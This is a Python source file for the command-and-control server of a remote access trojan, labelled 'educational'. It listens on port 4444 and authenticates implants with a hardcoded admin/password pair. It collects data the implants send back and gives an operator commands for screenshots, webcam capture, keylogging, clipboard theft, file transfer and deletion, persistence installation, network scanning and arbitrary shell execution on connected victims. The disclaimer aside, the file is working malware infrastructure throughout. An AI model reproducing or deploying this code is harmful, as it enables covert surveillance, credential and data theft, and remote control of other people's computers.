#!/usr/bin/env python3
# Educational RAT Server (CLI) - For learning purposes only
# This program should only be used in controlled test environments

import socket
import os
import sys
import threading
import platform
import time
import json

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from crypto_utils import send_msg, recv_msg, recv_msg_str, derive_key, AES_AVAILABLE
except ImportError:
    AES_AVAILABLE = False
    import struct
    def send_msg(sock, data, key=None):
        if isinstance(data, str): data = data.encode()
        sock.sendall(struct.pack('>I', len(data)) + data)
    def recv_msg(sock, key=None):
        raw = b""
        while len(raw) < 4:
            c = sock.recv(4 - len(raw))
            if not c: return None
            raw += c
        n = struct.unpack('>I', raw)[0]
        if n == 0: return b""
        if n > 50_000_000: return None
        data = b""
        while len(data) < n:
            c = sock.recv(min(65536, n - len(data)))
            if not c: return None
            data += c
        return data
    def recv_msg_str(sock, key=None):
        d = recv_msg(sock, key)
        return d.decode(errors='replace') if d is not None else None
    def derive_key(password): return None

ENCRYPTION_KEY = "edu_rat_default_key"

clients = {}
clients_lock = threading.Lock()
current_client = None
stop_flag = False


def _watchdog(stop_event, interval=10, timeout=35):
    """Removes clients that haven't sent a PING in `timeout` seconds."""
    while not stop_event.is_set():
        now = time.time()
        dead = []
        notices = []
        with clients_lock:
            for cid, info in list(clients.items()):
                # last_seen is always set at registration; no fallback needed
                last = info["last_seen"]
                if now - last > timeout:
                    dead.append((cid, info))
            for cid, info in dead:
                clients.pop(cid)
                try:
                    info["socket"].close()
                except Exception:
                    pass
                notices.append(f"\n[!] Client {info['address'][0]} timeout — removed (inactive {timeout}s)")
        # Print outside the lock to avoid lock-order inversion
        for msg in notices:
            print(msg)
        stop_event.wait(interval)


class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'


def print_banner():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    print(f"""
    {Colors.BLUE}{'=' * 60}{Colors.END}
    {Colors.BOLD}Educational Remote Access Tool - CLI Server{Colors.END}
    {Colors.RED}IMPORTANT: For educational purposes only{Colors.END}
    {Colors.BLUE}{'=' * 60}{Colors.END}
    """)


def setup_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((host, port))
        server.listen(5)
        server.settimeout(1.0)
        print(f"{Colors.GREEN}[+] Server listening on {host}:{port}{Colors.END}")
        enc = "AES-256" if AES_AVAILABLE else "None"
        print(f"{Colors.GREEN}[+] Encryption: {enc}{Colors.END}")
        return server
    except Exception as e:
        print(f"{Colors.RED}[!] Error starting server: {e}{Colors.END}")
        sys.exit(1)


def accept_connections(server, auth_user, auth_pass):
    global stop_flag, clients
    key = derive_key(ENCRYPTION_KEY)

    while not stop_flag:
        try:
            client_socket, address = server.accept()
            client_socket.settimeout(15)
            threading.Thread(target=handle_new_client,
                             args=(client_socket, address, auth_user, auth_pass, key),
                             daemon=True).start()
        except socket.timeout:
            continue
        except Exception as e:
            if not stop_flag:
                print(f"\n{Colors.RED}[!] Accept error: {e}{Colors.END}")
            break


def handle_new_client(client_socket, address, auth_user, auth_pass, key):
    global clients
    try:
        send_msg(client_socket, "AUTH", key)
        creds_raw = recv_msg_str(client_socket, key)
        if not creds_raw:
            client_socket.close()
            return
        creds = json.loads(creds_raw)
        if creds.get("username") != auth_user or creds.get("password") != auth_pass:
            send_msg(client_socket, "AUTH_FAILED", key)
            client_socket.close()
            print(f"\n{Colors.RED}[!] Auth failed from {address[0]}:{address[1]}{Colors.END}")
            return
        send_msg(client_socket, "AUTH_SUCCESS", key)

        send_msg(client_socket, "sysinfo", key)
        info = recv_msg_str(client_socket, key)
        if not info:
            client_socket.close()
            return

        client_socket.settimeout(None)

        with clients_lock:
            cid = max(clients.keys(), default=0) + 1
            clients[cid] = {
                "socket": client_socket,
                "address": address,
                "info": info,
                "key": key,
                "last_seen": time.time(),
            }
        print(f"\n{Colors.GREEN}[+] New client #{cid} from {address[0]}:{address[1]}{Colors.END}")
        print(f"{Colors.GREEN}[+] Info: {info}{Colors.END}")

        # Command loop: handle unsolicited messages from the client (e.g. PING)
        while True:
            try:
                command = recv_msg_str(client_socket, key)
                if command is None:
                    break
                if command == "PING":
                    send_msg(client_socket, "PONG", key)
                    with clients_lock:
                        if cid in clients:
                            clients[cid]["last_seen"] = time.time()
                    continue
                elif command.startswith("spool_data "):
                    raw = command[len("spool_data "):]
                    try:
                        data = json.loads(raw)
                        kind = data.get("kind", "unknown")
                        payload = data.get("payload", {})
                        ts = data.get("ts", 0)
                        print(f"\n[SPOOL] {kind} from {address[0]} @ {ts}: {str(payload)[:80]}")
                        send_msg(client_socket, "SPOOL_ACK", key)
                    except Exception as e:
                        send_msg(client_socket, "SPOOL_NACK", key)
            except Exception:
                break

        with clients_lock:
            clients.pop(cid, None)
        client_socket.close()

    except Exception as e:
        try:
            client_socket.close()
        except:
            pass


def list_clients():
    if not clients:
        print(f"{Colors.YELLOW}[!] No clients connected{Colors.END}")
        return
    print(f"\n{Colors.BOLD}Connected Clients:{Colors.END}")
    print("-" * 70)
    for cid, client in clients.items():
        addr = f"{client['address'][0]}:{client['address'][1]}"
        hostname = "Unknown"
        for part in client["info"].split("|"):
            if "Node:" in part:
                hostname = part.split(":", 1)[1].strip()
        enc = "AES" if client.get("key") else "Plain"
        print(f"  #{cid}  [{enc}]  {addr:20s}  {hostname}")
    print("-" * 70)
    print(f"  Total: {len(clients)}\n")


def interact_with_client(cid):
    global current_client
    if cid not in clients:
        print(f"{Colors.RED}[!] Client #{cid} not found{Colors.END}")
        return

    current_client = clients[cid]
    sock = current_client["socket"]
    key = current_client.get("key")
    print(f"{Colors.GREEN}[+] Interacting with client #{cid}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Type 'back' to return, 'help' for commands{Colors.END}")

    while True:
        try:
            cmd = input(f"{Colors.BOLD}[Client #{cid}]> {Colors.END}").strip()
            if not cmd:
                continue
            if cmd == "back":
                current_client = None
                print(f"{Colors.GREEN}[+] Returned to main menu{Colors.END}")
                break
            if cmd == "help":
                print(f"""
  {Colors.BOLD}Commands:{Colors.END}
    sysinfo, screenshot, webcam
    keylogger_start/stop/dump
    clipboard_start/stop/dump/current
    download <file>, upload <file>
    listdir [path], delete <file>
    persist_install [method], persist_remove, persist_check
    scan_network, scan_ports <ip>, scan_arp
    capabilities, exit, back
    (any other) = shell command
""")
                continue

            if cmd == "screenshot":
                send_msg(sock, "screenshot", key)
                status = recv_msg_str(sock, key)
                if status == "PASS":
                    img_data = recv_msg(sock, key)
                    if img_data:
                        fname = f"screenshot_{time.strftime('%Y%m%d_%H%M%S')}.png"
                        with open(fname, "wb") as f:
                            f.write(img_data)
                        print(f"{Colors.GREEN}[+] Saved: {fname} ({len(img_data)} bytes){Colors.END}")
                else:
                    print(f"{Colors.RED}[!] Screenshot failed{Colors.END}")

            elif cmd == "webcam":
                send_msg(sock, "webcam", key)
                status = recv_msg_str(sock, key)
                if status == "PASS":
                    img_data = recv_msg(sock, key)
                    if img_data:
                        fname = f"webcam_{time.strftime('%Y%m%d_%H%M%S')}.jpg"
                        with open(fname, "wb") as f:
                            f.write(img_data)
                        print(f"{Colors.GREEN}[+] Saved: {fname}{Colors.END}")
                else:
                    print(f"{Colors.RED}[!] Webcam failed{Colors.END}")

            elif cmd.startswith("download "):
                filepath = cmd.split(" ", 1)[1]
                send_msg(sock, cmd, key)
                status = recv_msg_str(sock, key)
                if status == "PASS":
                    file_data = recv_msg(sock, key)
                    if file_data:
                        local_name = os.path.basename(filepath)
                        with open(local_name, "wb") as f:
                            f.write(file_data)
                        print(f"{Colors.GREEN}[+] Downloaded: {local_name} ({len(file_data)} bytes){Colors.END}")
                else:
                    print(f"{Colors.RED}[!] File not found on client{Colors.END}")

            elif cmd.startswith("upload "):
                filepath = cmd.split(" ", 1)[1]
                if not os.path.isfile(filepath):
                    print(f"{Colors.RED}[!] Local file not found: {filepath}{Colors.END}")
                    continue
                with open(filepath, "rb") as f:
                    file_data = f.read()
                send_msg(sock, f"upload {os.path.basename(filepath)}", key)
                send_msg(sock, file_data, key)
                response = recv_msg_str(sock, key)
                print(f"{Colors.GREEN}{response}{Colors.END}")

            elif cmd == "scan_network":
                send_msg(sock, "scan_network", key)
                progress = recv_msg_str(sock, key)
                print(progress)
                send_msg(sock, "ACK", key)
                result = recv_msg_str(sock, key)
                print(result)

            elif cmd == "exit":
                send_msg(sock, "exit", key)
                clients.pop(cid, None)
                current_client = None
                print(f"{Colors.YELLOW}[+] Client disconnected{Colors.END}")
                break

            else:
                send_msg(sock, cmd, key)
                response = recv_msg_str(sock, key)
                if response is None:
                    print(f"{Colors.RED}[!] Connection lost{Colors.END}")
                    clients.pop(cid, None)
                    current_client = None
                    break
                print(response)

        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Type 'back' to return{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
            clients.pop(cid, None)
            current_client = None
            break


def main():
    global stop_flag

    print_banner()

    host = "0.0.0.0"
    port = 4444
    auth_user = "admin"
    auth_pass = "password"

    server = setup_server(host, port)

    conn_thread = threading.Thread(target=accept_connections,
                                   args=(server, auth_user, auth_pass), daemon=True)
    conn_thread.start()

    watchdog_stop = threading.Event()
    threading.Thread(target=_watchdog, args=(watchdog_stop,), daemon=True).start()

    print(f"""
  {Colors.BOLD}Commands:{Colors.END}
    list         - List connected clients
    select <id>  - Interact with client
    status       - Show server status
    exit         - Shut down server
""")

    while True:
        try:
            cmd = input(f"{Colors.BOLD}[Server]> {Colors.END}").strip()

            if cmd == "help":
                print("  list, select <id>, status, exit")
            elif cmd == "list":
                list_clients()
            elif cmd.startswith("select"):
                try:
                    cid = int(cmd.split()[1])
                    interact_with_client(cid)
                except (IndexError, ValueError):
                    print(f"{Colors.RED}[!] Usage: select <id>{Colors.END}")
            elif cmd == "status":
                print(f"  Clients: {len(clients)}, Listening: {host}:{port}")
            elif cmd == "exit":
                stop_flag = True
                watchdog_stop.set()
                for c in clients.values():
                    try: c["socket"].close()
                    except: pass
                server.close()
                print(f"{Colors.GREEN}[+] Server shut down{Colors.END}")
                break
            elif cmd == "":
                continue
            else:
                print(f"{Colors.RED}[!] Unknown command. Type 'help'{Colors.END}")

        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Type 'exit' to quit{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")


if __name__ == "__main__":
    if platform.system() == "Windows":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except:
            for attr in dir(Colors):
                if attr.isupper():
                    setattr(Colors, attr, '')
    main()
